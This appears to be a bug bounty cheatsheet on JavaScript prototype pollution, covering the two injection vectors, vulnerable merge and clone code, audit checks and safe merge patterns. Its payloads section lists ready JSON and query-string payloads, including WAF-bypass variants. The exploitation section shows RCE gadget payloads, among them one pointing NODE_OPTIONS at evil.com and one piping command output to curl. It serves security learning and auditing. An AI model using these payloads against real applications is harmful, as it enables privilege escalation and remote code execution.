# Prototype Pollution | Bug Bounty Cheatsheet

> **Category:** Client-Side / JavaScript  
> **Impact:** Auth bypass, privilege escalation, RCE (via gadget chains)  
> **Difficulty:** Medium  

---

## Table of Contents

1. [The Core Mechanic](#the-core-mechanic)
2. [Objects](#objects)
3. [Prototype Chain](#prototype-chain)
4. [Attack Vectors](#attack-vectors)
5. [Vulnerable Code Patterns](#vulnerable-code-patterns)
6. [Payloads](#payloads)
7. [Exploitation & Impact](#exploitation--impact)
8. [Audit Checklist](#audit-checklist)
9. [Safe Code Patterns](#safe-code-patterns)
10. [Tools](#tools)

---

## The Core Mechanic

All plain JS objects share `Object.prototype`. If you can write to it through user-controlled input, **every object in the application inherits your property**.

```
attacker input → vulnerable merge/clone → Object.prototype poisoned → all {} affected
```

---

## Objects

```javascript
// Properties accessible two ways — bracket notation is key for exploitation
const obj = { name: "alice" };
obj.name          // dot notation
obj["name"]       // bracket notation — works with variables and special strings

// Objects are references — mutation affects all references
const a = { x: 1 };
const b = a;
b.x = 99;
console.log(a.x); // 99

// Properties can be added at any time — JS objects are open
const obj = {};
obj.isAdmin = true;  // totally valid

// Own vs inherited
obj.hasOwnProperty("name")  // true  — lives on the object itself
"toString" in obj           // true  — walks the whole chain
obj.hasOwnProperty("toString") // false — inherited, not own
```

---

## Prototype Chain

Every object has a hidden `[[Prototype]]` link. When a property is missing, JS walks the chain upward until it hits `null`.

```
your_object
    └── [[Prototype]] → Object.prototype
                            └── toString(), hasOwnProperty(), valueOf()...
                            └── [[Prototype]] → null
```

```javascript
const obj = {};
Object.getPrototypeOf(obj) === Object.prototype  // true
Object.getPrototypeOf(Object.prototype)          // null — end of chain

// Arrays and functions have chains too
// arr → Array.prototype → Object.prototype → null
// fn  → Function.prototype → Object.prototype → null
```

**The attack surface:** `Object.prototype` is shared by every plain object. Poison it once, poison everything.

---

## Attack Vectors

### Vector 1 — `__proto__`

`__proto__` is a string-accessible getter/setter that directly exposes the prototype link.

```javascript
// Reading
const obj = {};
obj.__proto__ === Object.prototype  // true

// Writing — this is the attack
obj.__proto__.isAdmin = true;
({}).isAdmin  // true — every object affected

// Via bracket notation (survives JSON parsing)
const key = "__proto__";
obj[key].isAdmin = true;  // identical
```

**JSON payload:**
```json
{ "__proto__": { "isAdmin": true } }
```

> ⚠️ `JSON.parse` itself is safe — it returns a plain object with a literal `"__proto__"` key. The danger is what the app does with that object afterwards.

---

### Vector 2 — `constructor.prototype`

Every object inherits a `constructor` property pointing to the function that created it. That function has a `prototype` property — which is `Object.prototype`.

```javascript
const obj = {};
obj.constructor           // Object (the constructor function)
obj.constructor.prototype // Object.prototype  ← same target
obj.constructor.prototype === Object.prototype  // true

// Attack
obj.constructor.prototype.isAdmin = true;
({}).isAdmin  // true
```

**JSON payload:**
```json
{ "constructor": { "prototype": { "isAdmin": true } } }
```

**Why this matters:** Developers often patch `__proto__` and forget `constructor.prototype`. Always test both.

---

### Both Paths — Same Destination

```javascript
// Path 1
obj["__proto__"]["isAdmin"] = true;

// Path 2
obj["constructor"]["prototype"]["isAdmin"] = true;

// Result either way:
Object.prototype.isAdmin  // true
```

---

## Vulnerable Code Patterns

### Pattern 1 — Hand-rolled deep merge (most common sink)

```javascript
// VULNERABLE
function merge(target, source) {
  for (let key in source) {                    // ← for...in walks prototype chain
    if (typeof source[key] === "object") {
      merge(target[key], source[key]);          // ← no key filtering, recurses into __proto__
    } else {
      target[key] = source[key];
    }
  }
}
```

### Pattern 2 — Recursive clone

```javascript
// VULNERABLE
function clone(obj) {
  const result = {};
  for (let key in obj) {                       // ← for...in
    result[key] = typeof obj[key] === "object"
      ? clone(obj[key])                        // ← recurses into __proto__
      : obj[key];
  }
  return result;
}
```

### Pattern 3 — extend / defaults

```javascript
// VULNERABLE
function extend(target, ...sources) {
  for (const source of sources) {
    for (const key in source) {               // ← for...in
      if (typeof source[key] === "object") {
        target[key] = extend(target[key] || {}, source[key]);
      } else {
        target[key] = source[key];            // ← no guard
      }
    }
  }
  return target;
}
```

### Tracing the exploit through a deep merge

Input: `{"__proto__": {"isAdmin": true}}`

```
deepMerge(target={}, source={"__proto__": {"isAdmin": true}})
  key = "__proto__"
  source["__proto__"] is an object
  → deepMerge(target["__proto__"], { isAdmin: true })
  → deepMerge(Object.prototype, { isAdmin: true })
      key = "isAdmin"
      → Object.prototype["isAdmin"] = true  ✓ POLLUTED
```

---

## Payloads

### Basic auth bypass

```json
{ "__proto__": { "isAdmin": true } }
{ "__proto__": { "isAdmin": 1 } }
{ "__proto__": { "admin": true } }
{ "__proto__": { "role": "admin" } }
```

### constructor.prototype variants

```json
{ "constructor": { "prototype": { "isAdmin": true } } }
{ "constructor": { "prototype": { "admin": 1 } } }
```

### Nested / encoded variants (WAF bypass)

```json
{ "__pro__proto__to__": { "isAdmin": true } }
{ "__proto__": { "__proto__": { "isAdmin": true } } }
```

URL-encoded (query params):
```
?__proto__[isAdmin]=true
?__proto__[role]=admin
?constructor[prototype][isAdmin]=true
```

### Confirming pollution

```javascript
// Drop this in console after sending payload
({}).isAdmin   // if true — polluted
```

---

## Exploitation & Impact

### Impact 1 — Authentication bypass

```javascript
// App code
if (user.isAdmin) { grantAccess(); }

// Pollution makes this true for every user object
```

### Impact 2 — Property injection

```javascript
// App uses merge to apply user options to a template
const options = merge(defaultOptions, userInput);

// Pollute: { "__proto__": { "template": "<script>alert(1)</script>" } }
// Now defaultOptions.template is attacker-controlled
```

### Impact 3 — RCE via gadget chains

Certain properties when polluted can reach dangerous sinks in Node.js:

```json
{ "__proto__": { "shell": "node", "NODE_OPTIONS": "--inspect=evil.com" } }
{ "__proto__": { "execPath": "/bin/bash", "execArgv": ["-c", "id | curl ..."] } }
```

Common gadget targets: `child_process`, template engines (Handlebars, Pug, EJS), `lodash.template`.

---

## Audit Checklist

When reviewing source code or a merge/clone/extend function:

```
□ Is the source data user-controlled? (JSON body, query params, headers)
□ Does the function use `for...in` instead of `Object.keys()`?
□ Does it recurse into nested objects?
□ Is `__proto__` explicitly filtered?
□ Is `constructor` explicitly filtered?
□ Is `prototype` explicitly filtered?
□ Are null checks in place before recursing?
□ Is `hasOwnProperty` used to guard property access?
```

Any unchecked box on user-controlled input = potential finding.

### Red flags in source code

```javascript
for (let key in source)          // walks prototype chain — red flag
source[key]                      // no key validation — red flag
typeof x === "object" && recurse // deep merge without guards — red flag
target[key] = source[key]        // blind assignment — red flag
```

---

## Safe Code Patterns

### Safe deep merge

```javascript
function safeMerge(target, source) {
  for (let key of Object.keys(source)) {       // Object.keys = own props only
    if (key === "__proto__") continue;          // block vector 1
    if (key === "constructor") continue;        // block vector 2
    if (key === "prototype") continue;          // block vector 2 (nested)

    if (
      typeof source[key] === "object" &&
      source[key] !== null &&
      !Array.isArray(source[key])
    ) {
      target[key] = target[key] || {};
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

### Safe alternatives for reading prototype

```javascript
Object.getPrototypeOf(obj)         // read-only, no string access risk
Object.create(null)                // creates object with NO prototype at all
Object.assign({}, source)          // shallow — skips __proto__ automatically
```

### `for...in` vs `Object.keys()` — the key distinction

```javascript
// for...in — walks entire chain, includes inherited enumerable props
for (let key in obj) { ... }      // UNSAFE for merging user input

// Object.keys() — own properties only
Object.keys(obj).forEach(key => { ... })  // SAFE
```

---

## Tools

| Tool | Use |
|---|---|
| [ppfuzz](https://github.com/dwisiswant0/ppfuzz) | Automated prototype pollution fuzzer |
| [proto-find](https://github.com/nicktindall/proto-find) | Find PP vulnerabilities in JS code |
| Burp Suite | Intercept and modify JSON payloads |
| Browser DevTools console | Verify pollution with `({}).yourKey` |
| [yeswehack pp cheatsheet](https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/) | Extended server-side PP techniques |

---

## Quick Reference Card

```
VECTORS
  __proto__                     → obj["__proto__"]["x"] = 1
  constructor.prototype         → obj["constructor"]["prototype"]["x"] = 1

PAYLOADS
  {"__proto__":{"isAdmin":true}}
  {"constructor":{"prototype":{"isAdmin":true}}}
  ?__proto__[isAdmin]=true

CONFIRM
  ({}).isAdmin === true  → polluted

SINKS TO HUNT
  deep merge / clone / extend functions
  for...in loops on user input
  recursive object assignment

SAFE PATTERNS
  Object.keys() not for...in
  filter __proto__ + constructor + prototype
  Object.create(null) for prototype-less objects
```

---

*Part of [bounty-brain](https://github.com/logan-sec/bounty-brain) — Day 13: Prototype Pollution*
